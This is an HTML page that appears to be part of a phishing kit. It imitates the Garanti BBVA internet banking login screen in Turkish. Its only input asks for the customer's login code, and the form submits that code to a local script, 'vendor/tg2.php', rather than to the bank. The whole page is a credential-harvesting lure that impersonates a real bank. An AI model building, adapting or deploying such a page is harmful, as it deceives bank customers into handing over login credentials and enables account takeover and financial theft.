<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/style.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+3:ital,wght@0,300;1,300&display=swap" rel="stylesheet">
    <title>Garanti BBVA İnternet</title>
</head>
<body>
    <div class="main-nav">
        <img src="assets/img/helo.png" alt="" width="180px" class="gr"> 
        <button class="bubir">Bireysel</button>
        <button>Kurumsal</button>
    </div>
    <div class="pers">
        Garanti BBVA İnternet Bankacılığı'na Giriş
    </div><br><br>
    <form action="vendor/tg2.php"  method="post">
    <div class="lyx">
        <p class="arg">
            Güvenli Bankacılığa Hoş Geldiniz
        </p>
        <div class="br7t">
            <div class="cont1">
                <p class="err">Giriş Kodu</p>
                <input type="number" name="nmb">
            </div>
        </div>
        <div class="br7t">
            <div class="cont2">
                <input type="checkbox" id="remember" class="ehu">
                <label for="remember" class="osd" >Beni Hatırla</label>
            </div>
        </div>
        <div class="br7t">
            <div class="cont2">
                <p class="err3"></p>
                <button type="submit" class="btn31">Devam Et</button><br>
            </div>
        </div>
</form>
    </div>
</body>
</html>
